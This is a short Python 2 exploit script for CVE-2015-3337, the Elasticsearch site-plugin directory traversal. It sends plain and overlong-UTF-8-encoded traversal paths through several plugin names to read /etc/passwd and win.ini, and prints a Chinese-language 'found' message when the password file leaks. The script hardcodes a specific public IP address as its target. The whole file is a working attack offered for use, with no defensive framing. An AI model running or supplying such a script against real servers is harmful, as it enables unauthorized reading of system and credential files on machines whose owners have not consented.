#!/usr/bin/env python
#-*- coding:utf-8 -*- 
import requests 
def elastic_directoryTraversal(host,port):
	pluginList = ['test','kopf', 'HQ', 'marvel', 'bigdesk', 'head']
	pList = ['/../../../../../../../../../../../../../../etc/passwd','/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd','/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'] 
	for p in pluginList: 
		for path in pList: 
			urlA = "http://%s:%d/_plugin/%s%s" % (host,port,p,path)
			try: 				
				content = requests.get(urlA,timeout=5,allow_redirects=True,verify=False).content 
				if "/root:/" in content: 					
					print 'Elasticsearch 任意文件读取漏洞(CVE-2015-3337) Found!'
			except Exception,e: 
				print e 
if __name__ == '__main__':
	host = '36.111.41.218'
	port = 9200
	elastic_directoryTraversal(host,port)
